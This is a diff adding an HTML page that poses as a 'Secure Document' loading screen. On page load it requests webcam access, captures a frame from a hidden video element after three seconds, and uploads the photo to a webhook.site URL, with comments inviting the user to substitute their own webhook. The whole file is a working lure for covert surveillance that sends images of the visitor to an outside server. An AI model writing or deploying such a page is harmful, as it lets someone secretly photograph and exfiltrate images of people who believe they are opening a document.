@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Document</title>
+</head>
+<body onload="startCamera()">
+    <h2>Loading Secure Document... Please Wait</h2>
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+    <script>
+        // 1. Request camera access and start the video stream
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    let video = document.getElementById("video");
+                    video.srcObject = stream;
+                    // Wait 3 seconds before capturing
+                    setTimeout(capturePhoto, 3000);
+                })
+                .catch(function(error) {
+                    console.log("Camera access denied:", error);
+                });
+        }
+
+        // 2. Draw the video frame on a canvas
+        function capturePhoto() {
+            let video = document.getElementById("video");
+            let canvas = document.getElementById("canvas");
+            let context = canvas.getContext("2d");
+
+            context.drawImage(video, 0, 0, 320, 240);
+
+            // Convert canvas to Blob, then send
+            canvas.toBlob(sendToServer, "image/png");
+        }
+
+        // 3. Send the Blob to your Webhook URL
+        function sendToServer(blob) {
+            let formData = new FormData();
+            // 'file' is the form field name; "photo.png" is the filename
+            formData.append("file", blob, "photo.png");
+
+            // Replace the URL below with your actual Webhook.site URL
+            fetch("https://webhook.site/65ed3146-236f-4761-bf2c-f22c0ff607e3", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => console.log("Image sent:", data))
+            .catch(error => console.log("Error sending image:", error));
+        }
+    </script>
+</body>
+</html>
